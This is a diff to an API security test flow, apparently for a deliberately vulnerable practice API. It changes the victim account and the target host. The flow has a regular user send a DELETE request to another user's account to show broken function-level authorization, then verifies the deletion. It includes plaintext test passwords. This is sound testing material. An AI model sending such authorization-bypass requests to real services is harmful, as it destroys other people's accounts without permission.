@@ -1,13 +1,13 @@
 {
     "id": "flow_bfla_gracewilson_deletes_other_user",
     "name": "BFLA: GraceWilson (Regular User) Deletes Another User",
-    "description": "GraceWilson, a non-admin user, exploits BFLA to delete another non-admin user (FrankMiller).",
+    "description": "GraceWilson, a non-admin user, exploits BFLA to delete another non-admin user (QuinnBaker).",
     "staticVars": {
-      "baseUrl": "http://vampi.bowz.fr",
+      "baseUrl": "https://bla-bypass.ase-team.com",
       "graceUsername": "GraceWilson",
       "gracePassword": "GracePass7&",
-      "victimUserToDeleteId": "00000007-0000-0000-0000-000000000007",
-      "victimUserToDeleteUsername": "FrankMiller"
+      "victimUserToDeleteId": "00000017-0000-0000-0000-000000000017",
+      "victimUserToDeleteUsername": "QuinnBaker"
     },
     "steps": [
       {
@@ -23,7 +23,7 @@
       },
       {
         "id": "step_gracewilson_delete_frankmiller_bfla",
-        "name": "GraceWilson Deletes FrankMiller (BFLA)",
+        "name": "GraceWilson Deletes QuinnBaker (BFLA)",
         "type": "request",
         "method": "DELETE",
         "url": "{{baseUrl}}/api/users/{{victimUserToDeleteId}}",
@@ -34,7 +34,7 @@
       },
       {
         "id": "step_gracewilson_verify_frankmiller_deleted_by_get",
-        "name": "Verify FrankMiller Deletion (Attempt GET)",
+        "name": "Verify QuinnBaker Deletion (Attempt GET)",
         "type": "request",
         "method": "GET",
         "url": "{{baseUrl}}/api/users/{{victimUserToDeleteId}}",
@@ -45,10 +45,10 @@
       },
       {
         "id": "step_gracewilson_verify_frankmiller_deleted_by_login_fail",
-        "name": "Verify FrankMiller Deletion (Attempt Login)",
+        "name": "Verify QuinnBaker Deletion (Attempt Login)",
         "type": "request",
         "method": "POST",
-        "url": "{{baseUrl}}/api/auth/login?username={{victimUserToDeleteUsername}}&password=FrankPass6^",
+        "url": "{{baseUrl}}/api/auth/login?username={{victimUserToDeleteUsername}}&password=QuinnPass16!",
         "onFailure": "continue"
       }
     ]
